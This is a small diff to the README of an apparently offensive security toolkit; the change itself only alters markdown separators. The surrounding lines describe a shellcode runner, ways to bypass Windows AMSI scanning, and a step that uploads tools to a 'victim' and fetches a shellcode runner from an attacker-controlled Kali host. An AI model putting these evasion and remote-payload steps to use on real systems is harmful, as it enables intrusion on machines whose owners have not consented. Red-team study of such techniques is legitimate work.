@@ -37,7 +37,7 @@ The executable **des_decryptor.exe** is downloading the file from your Web serve
 The executable embedds a shellcode runner. You can run it without providing any commands. 
 ```cmd> des_decryptor_embedded.exe```
 
---
+----
 
 **[+] AMSI Bypass [+]**
 There are two methods to bypass AMSI:
@@ -63,7 +63,7 @@ To unhook AMSI, I've used the project by jfmaes - AmsiHooker (https://github.com
 1. Upload unhook_amsi.exe and MinHook.NET.dll to victim. (Files located under payloads/AMSI/)
 2. unhook_amsi.exe http://<KALI>/shellcode_runner.exe
 
---
+----
 
  **[+] Executing .XSL, .JS, .HTA [+]**
 
